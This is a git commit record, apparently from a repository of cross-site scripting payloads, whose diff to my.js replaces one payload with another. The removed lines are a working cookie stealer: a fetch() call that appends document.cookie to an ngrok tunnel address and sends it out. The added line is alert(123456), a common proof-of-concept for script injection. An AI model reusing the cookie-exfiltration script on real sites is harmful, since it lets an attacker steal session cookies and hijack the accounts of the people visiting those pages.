876c50fef84129b469b7a382c57b08fb2fb6f9a2
quitbug <155615252+quitbug@users.noreply.github.com>
2026-03-13 02:08:03 +0800

    Update my.js

--- my.js
+++ my.js
@@ -1,13 +1,1 @@
-fetch('https://b8bf34f0a1d0.ngrok-free.app/'+document.cookie, {method: 'GET', mode:'no-cors'})
-  .then(response => {
-    if (!response.ok) {
-      throw new Error(`HTTP error! Status: ${response.status}`);
-    }
-    return response.text(); 
-  })
-  .then(data => {
-    console.log('Server response:', data);
-  })
-  .catch(error => {
-    console.error('Request failed:', error);
-  });
+alert(123456);
